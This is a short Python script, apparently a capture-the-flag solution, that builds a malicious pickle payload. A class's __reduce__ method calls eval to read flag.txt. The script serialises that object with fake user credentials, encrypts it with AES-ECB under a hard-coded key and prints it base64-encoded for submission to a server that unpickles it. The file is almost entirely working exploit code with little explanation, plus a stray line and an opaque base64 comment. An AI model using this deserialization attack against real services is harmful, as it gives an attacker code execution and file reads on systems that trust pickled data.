import pickle, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
# e43t4TxobdsqffJGA3rtQPKxhEET2V1SUtD7NsR5ebauC+IHhnDkbohTzM/ub5jd8QgXe4g7zcW7/pnhxGauY1lWkNaiH24GsLAPoaHGwxfJaA3C4wi00vUbg5pyAwO3+zzAVOKl/74GEifUqgDPbTkF6X8SsWfsl/vm3WvPjs0=
s
# AES -> serialize -> base64
def encrypt(data): #AES
    cipher = AES.new("36f6d9a966c4478c73af4fde2f813212".encode(), AES.MODE_ECB)
    return cipher.encrypt(pad(data, AES.block_size))

class WebcomeExploit: # class 생성
    def __reduce__(self):
        cmd = "open('./flag.txt', 'r').read()"
        return (__builtins__.eval, (cmd,))


data = {'name': WebcomeExploit(), 'userid': 'modori205', 'password': '123456'}
payload = base64.b64encode(encrypt(pickle.dumps(data))).decode('utf8') # 직렬화 + base64
print(payload)
